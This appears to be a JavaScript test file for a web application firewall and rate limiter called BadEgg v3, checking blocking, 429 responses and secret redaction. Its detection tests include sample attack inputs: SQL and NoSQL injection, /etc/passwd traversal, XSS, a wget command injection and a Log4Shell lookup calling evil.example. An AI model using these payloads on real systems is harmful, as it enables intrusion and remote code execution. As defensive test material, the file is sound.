import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import {
  BADEGG_VERSION,
  FALLBACK_TEMPLATE,
  RateLimiter,
  badeggStatus,
  handleBadEggRequest,
  ipToU32,
  match,
  parse6,
  redactText,
  resetBadEggV3State,
  resolveConfig,
  safeRoute,
  scanText,
} from "../functions/_badegg.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, "..");

function makeMockEnv(overrides = {}) {
  const store = new Map();
  return {
    IDI_BADEGG: {
      async get(key, opts) {
        const raw = store.get(key);
        if (!raw) return null;
        if (opts?.type === "json") return JSON.parse(raw);
        return raw;
      },
      async put(key, value) {
        store.set(key, value);
      },
    },
    ...overrides,
  };
}

test("BadEgg v3 version and rule count", () => {
  resetBadEggV3State();
  const status = badeggStatus();
  assert.equal(BADEGG_VERSION, "3.0");
  assert.equal(status.version, "3.0");
  assert.equal(status.engine, "BadEgg v3");
  assert.equal(status.waf.rulesLoaded, 29);
});

test("IPv4 and IPv6 schema-2 matching", () => {
  const index = {
    v4Ips: new Uint32Array([ipToU32("198.51.100.42")].sort((a, b) => a - b)),
    v4Starts: new Uint32Array([ipToU32("203.0.113.0")]),
    v4Ends: new Uint32Array([ipToU32("203.0.113.255")]),
    v6Ips: new Set(["20010db8000000000000000000000001"]),
    v6Starts: ["20010db8abcd00000000000000000000"],
    v6Ends: ["20010db8abcdffffffffffffffffffff"],
  };
  assert.ok(parse6("2001:db8::1"));
  assert.equal(match(index, "198.51.100.42").blocked, true);
  assert.equal(match(index, "::ffff:198.51.100.42").blocked, true);
  assert.equal(match(index, "203.0.113.99").blocked, true);
  assert.equal(match(index, "2001:db8::1").blocked, true);
  assert.equal(match(index, "2001:db8:abcd::dead:beef").blocked, true);
  assert.equal(match(index, "192.0.2.1").blocked, false);
});

test("BadEgg v3 attack family detection & risk profile thresholds", () => {
  resetBadEggV3State();

  // High-confidence SQLi tautology blocks in minimize_false_bans
  const sqli = scanText({
    direction: "input",
    text: "q=1 UNION SELECT password FROM users' OR '1'='1",
    clientIp: "203.0.113.8",
    live: false,
  });
  assert.equal(sqli.decision, "would_temp_block");
  assert.equal(sqli.rawContentRetained, false);

  // Medium traversal (0.91) reviews in cautious mode, challenges in catch_more
  const cautious = scanText({
    direction: "input",
    text: "../../assets/logo.png",
    clientIp: "203.0.113.10",
    config: resolveConfig({ BADEGG_RISK_MODE: "minimize_false_bans" }),
  });
  const aggressive = scanText({
    direction: "input",
    text: "../../assets/logo.png",
    clientIp: "203.0.113.11",
    config: resolveConfig({ BADEGG_RISK_MODE: "catch_more" }),
  });
  assert.equal(cautious.decision, "would_alert_for_review");
  assert.equal(aggressive.decision, "would_challenge");

  // Sensitive traversal (/etc/passwd) blocks in both profiles
  const lfi = scanText({
    direction: "input",
    text: "GET /files?name=../../etc/passwd",
    clientIp: "203.0.113.12",
  });
  assert.equal(lfi.decision, "would_temp_block");

  // Obfuscated javascript: XSS, command injection, Log4Shell, NoSQL
  for (const payload of [
    "<svg onload='alert(1)'>",
    "url=jav&#x09;ascript:alert(1)",
    "target=app && wget http://evil.example/p",
    "User-Agent: ${jndi:ldap://evil.example/a}",
    '{"password":{"$ne":null}}',
  ]) {
    const res = scanText({ direction: "input", text: payload, clientIp: "203.0.113.50" });
    assert.equal(res.decision, "would_temp_block", `Expected block on: ${payload}`);
  }

  // Benign prose does NOT trigger false positives
  for (const benign of [
    "Proof: for all n, if n is even then n and 2 = 2 divides n.",
    "Scores were tied 1 = 1 after the first half.",
    "Support note: we accept pets; cat, dog, and parrots.",
    "GET /members/3spress0/confluence\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0)",
  ]) {
    const res = scanText({ direction: "input", text: benign, clientIp: "203.0.113.60" });
    assert.equal(res.decision, "clean", `Expected clean on: ${benign}`);
  }
});

test("RateLimiter token bucket, Retry-After, and strike escalation", () => {
  let now = 1_000_000;
  const limiter = new RateLimiter({ clock: () => now, maxSources: 8 });
  const opts = { requests: 60, windowSeconds: 60, burst: 3, banAfter: 2 };

  assert.equal(limiter.check("198.51.100.1", opts).allowed, true);
  assert.equal(limiter.check("198.51.100.1", opts).allowed, true);
  assert.equal(limiter.check("198.51.100.1", opts).allowed, true);

  const first = limiter.check("198.51.100.1", opts);
  assert.equal(first.allowed, false);
  assert.equal(first.retryAfter, 1);
  assert.equal(first.escalate, false);

  const second = limiter.check("198.51.100.1", opts);
  assert.equal(second.allowed, false);
  assert.equal(second.escalate, true);

  now += 2000;
  assert.equal(limiter.check("198.51.100.1", opts).allowed, true);
});

test("Full edge middleware pipeline: WAF temp ban, 429 rate limit, and header secret redaction", async () => {
  resetBadEggV3State();
  const env = makeMockEnv({
    BADEGG_RATE_LIMIT_BURST: "2",
    BADEGG_RATE_LIMIT_REQUESTS: "60",
    BADEGG_RATE_LIMIT_WINDOW_S: "60",
    BADEGG_RATE_LIMIT_BAN_AFTER: "5",
  });

  const origFetch = globalThis.fetch;
  globalThis.fetch = async () => new Response("offline", { status: 503 });
  try {
    // 1. High-confidence attack earns an immediate 403 + temporary exact-IP ban
    const attackReq = new Request("https://idi-official.pages.dev/?q=%27%20OR%20%271%27%3D%271", {
      headers: { "CF-Connecting-IP": "198.51.100.77", Accept: "text/html" },
    });
    const attackRes = await handleBadEggRequest(
      attackReq,
      env,
      { waitUntil: () => {} },
      async () => new Response("should not reach origin", { status: 200 })
    );
    assert.equal(attackRes.status, 403);
    assert.equal(attackRes.headers.get("x-badegg-version"), "3.0");
    const blockedHtml = await attackRes.text();
    assert.match(blockedHtml, /sql_injection/);

    // Subsequent clean request from the same IP is blocked by the active temp ban
    const followUp = new Request("https://idi-official.pages.dev/projects", {
      headers: { "CF-Connecting-IP": "198.51.100.77" },
    });
    const followUpRes = await handleBadEggRequest(
      followUp,
      env,
      { waitUntil: () => {} },
      async () => new Response("ok")
    );
    assert.equal(followUpRes.status, 403);
    assert.ok(Number(followUpRes.headers.get("retry-after")) > 0);

    // 2. Rate limiting returns 429 + Retry-After for a fresh IP exceeding burst=2
    const mkClean = () =>
      new Request("https://idi-official.pages.dev/", {
        headers: { "CF-Connecting-IP": "198.51.100.88", Accept: "text/html" },
      });
    const r1 = await handleBadEggRequest(
      mkClean(),
      env,
      { waitUntil: () => {} },
      async () => new Response("ok")
    );
    const r2 = await handleBadEggRequest(
      mkClean(),
      env,
      { waitUntil: () => {} },
      async () => new Response("ok")
    );
    const r3 = await handleBadEggRequest(
      mkClean(),
      env,
      { waitUntil: () => {} },
      async () => new Response("ok")
    );
    assert.equal(r1.status, 200);
    assert.equal(r2.status, 200);
    assert.equal(r3.status, 429);
    assert.ok(Number(r3.headers.get("retry-after")) >= 1);

    // 3. Outgoing response header secret redaction
    const cleanIpReq = new Request("https://idi-official.pages.dev/", {
      headers: { "CF-Connecting-IP": "127.0.0.1" },
    });
    const secretRes = await handleBadEggRequest(
      cleanIpReq,
      env,
      { waitUntil: () => {} },
      async () =>
        new Response("hello", {
          status: 200,
          headers: {
            "X-Upstream-Trace": "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890",
            "X-Debug-Token": "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890",
          },
        })
    );
    assert.equal(secretRes.status, 200);
    assert.equal(secretRes.headers.get("x-upstream-trace"), "[REDACTED_API_CREDENTIAL]");
    assert.equal(secretRes.headers.get("x-debug-token"), "[REDACTED]");

    // 4. ?badegg-status=1 never leaks client IPs
    const statusReq = new Request("https://idi-official.pages.dev/?badegg-status=1", {
      headers: { authorization: "Bearer test-token-at-least-16-chars" },
    });
    const statusRes = await handleBadEggRequest(
      statusReq,
      env,
      { waitUntil: () => {} },
      async () => new Response("unused")
    );
    const statusText = await statusRes.text();
    assert.doesNotMatch(statusText, /198\.51\.100\.77/);
    assert.doesNotMatch(statusText, /198\.51\.100\.88/);
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("safeRoute and redactText scrub secrets and tokens", () => {
  assert.equal(
    redactText("note=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"),
    "note=[REDACTED_API_CREDENTIAL]"
  );
  assert.equal(
    redactText("token=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"),
    "token=[REDACTED]"
  );
  assert.equal(
    safeRoute("/reset/0123456789abcdef0123456789abcdef?secret=1"),
    "/reset/[REDACTED_ID]"
  );
});

test("403.html and FALLBACK_TEMPLATE carry identical placeholders and structure", () => {
  const disk403 = fs.readFileSync(path.join(ROOT, "403.html"), "utf8");
  assert.ok(disk403.includes("{{MAILTO}}"));
  assert.ok(disk403.includes("{{IP_CHIP}}"));
  assert.ok(FALLBACK_TEMPLATE.includes("{{MAILTO}}"));
  assert.ok(FALLBACK_TEMPLATE.includes("{{IP_CHIP}}"));
});
